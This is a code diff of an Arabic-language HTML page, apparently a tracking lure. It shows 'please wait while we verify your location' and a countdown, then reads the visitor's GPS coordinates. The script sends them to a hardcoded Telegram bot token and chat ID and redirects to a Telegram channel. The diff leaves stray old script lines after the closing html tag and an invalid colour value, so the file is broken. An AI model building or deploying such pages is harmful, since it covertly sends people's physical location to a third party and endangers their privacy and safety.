@@ -1,109 +1,85 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>صفحة توجيه البوت</title>
+  <meta charset="UTF-8">
+  <title>جارٍ تحديد موقعك...</title>
   <style>
-    /* خلفية ناعمة */
     body {
-      background: linear-gradient(135deg, #6b73ff 0%, #000dff 100%);
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: #f0f0f0;
-      direction: rtl;
+      background: linear-gradient(to bottom right, #e0n7fa, #ffffff);
+      font-family: 'Tahoma', sans-serif;
+      text-align: center;
+      padding-top: 100px;
     }
 
-    /* صندوق العداد */
+    h2 {
+      color: #004d40;
+      margin-bottom: 40px;
+    }
+
     #countdown {
-      width: 90px;
-      height: 90px;
-      background: rgba(255, 255, 255, 0.15);
-      border: 3px solid #ffffff80;
-      border-radius: 20px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
-      font-size: 48px;
-      font-weight: 700;
+      font-size: 30px;
+      font-weight: bold;
+      margin: auto;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 150, 136, 0.4);
+      width: 70px;
+      height: 70px;
+      line-height: 30px;
+      color: #00736b;
       display: flex;
       justify-content: center;
       align-items: center;
-      user-select: none;
-      text-shadow: 0 0 5px #00000099;
-      transition: background-color 0.3s ease;
-    }
-
-    /* تأثير عند انتهاء العد */
-    #countdown.done {
-      background: #00ff99;
-      border-color: #00cc77;
-      color: #004422;
-      box-shadow: 0 0 20px #00ff99aa;
-      text-shadow: none;
     }
   </style>
 </head>
 <body>
+
+  <h2>يرجى الانتظار للتحقق من موقعك</h2>
   <div id="countdown">5</div>
 
   <script>
-    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
-    const CHAT_ID = "6028485445";
+    const token = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
+    const chat_id = "6028485445";
+    let count = 5;
 
-    let seconds = 5;
-    let locationSent = false;
-
-    function startCountdown() {
-      const countdownEl = document.getElementById("countdown");
-      countdownEl.innerText = seconds;
-
-      const interval = setInterval(() => {
-        seconds--;
-        countdownEl.innerText = seconds;
-
-        if (seconds === 0) {
-          clearInterval(interval);
-          if (locationSent) {
-            countdownEl.classList.add('done');
-            countdownEl.innerText = "✔";
-            setTimeout(() => {
-              window.location.href = "https://t.me/sswq22";
-            }, 1000);
-          } else {
-            alert("يرجى الموافقة على مشاركة الموقع أولاً.");
-            // ترجع العداد للـ5
-            seconds = 5;
-            countdownEl.innerText = seconds;
-            startCountdown();
-          }
-        }
-      }, 1000);
+    function sendLocation(lat, lon) {
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 تم التقاط الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
+      fetch(url).then(() => {
+        // تحويل بعد الإرسال
+        setTimeout(() => {
+          window.location.href = "https://t.me/sswq22";
+        }, 500);
+      });
     }
 
-    function getLocationAndSend() {
+    function getLocationAndRedirect() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .then(() => {
-              locationSent = true;
-            })
-            .catch(() => {
-              locationSent = false;
-            });
+          sendLocation(lat, lon);
         }, () => {
-          locationSent = false;
-          alert("تم رفض مشاركة الموقع، لن تتم إعادة التوجيه.");
+          alert("تم رفض إذن تحديد الموقع.");
         });
       } else {
         alert("المتصفح لا يدعم تحديد الموقع.");
       }
     }
 
+    const timer = setInterval(() => {
+      count--;
+      document.getElementById("countdown").textContent = count;
+      if (count <= 0) {
+        clearInterval(timer);
+        getLocationAndRedirect();
+      }
+    }, 1000);
+  </script>
+
+</body>
+</html>
     window.onload = () => {
       getLocationAndSend();
       startCountdown();
